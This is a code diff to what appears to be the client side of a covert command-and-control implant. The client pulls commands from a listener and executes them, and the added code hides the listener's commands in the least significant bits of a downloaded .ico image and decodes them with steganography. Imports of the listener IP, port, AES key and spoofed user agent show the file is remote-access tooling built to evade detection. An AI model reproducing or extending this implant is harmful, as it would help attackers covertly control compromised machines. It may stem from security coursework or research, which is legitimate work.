@@ -15,6 +15,7 @@ import random
 import string
 from Crypto.Cipher import AES
 from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, USER_AGENT, CLIENT_MAX_MESSAGE_LENGTH, AES_KEY, AES_IV, RequestFlags
+from PIL import Image
 
 # Time in seconds to wait for a http response before a timeout occurs.
 # This time should be long, to give user ample time to input their commands into the listener. 
@@ -150,7 +151,38 @@ def send_stego_data_to_listener(data: str):
 
 def get_command_line_input(response: Response):
     # for now, listener reply is simply stored in the response text TODO: store and retrieve it via image steganoraphy
-    return response.text
+    secret = "secret_web/secret2.ico"
+    #data = response.read()
+    with open(secret, "wb") as f:
+        f.write(response.content)
+    #     # Open the ICO file and extract the first frame
+    img = Image.open(secret)
+    img = img.convert("RGB")  # Convert to RGB to ensure consistency
+    pixels = list(img.getdata())
+    binary_text = ""
+    
+    # Extract LSBs from the pixel data
+    for pixel in pixels:
+        r, g, b = pixel
+        binary_text += str(r & 1)  # Extract LSB of Red
+        binary_text += str(g & 1)  # Extract LSB of Green
+        binary_text += str(b & 1)  # Extract LSB of Blue
+    
+    # Check for end marker
+    if "1111111111111110" in binary_text:
+        binary_text = binary_text[:binary_text.index("1111111111111110")]
+    
+    # Split binary text into 8-bit chunks
+    chars = [binary_text[i:i+8] for i in range(0, len(binary_text), 8)]
+    decoded_text = ""
+    for char in chars:
+        try:
+            decoded_text += chr(int(char, 2))
+        except ValueError:
+            continue  # Skip invalid characters
+    
+    return decoded_text
+    #return response.text
 
 
 def execute_command_line_input(input: str):
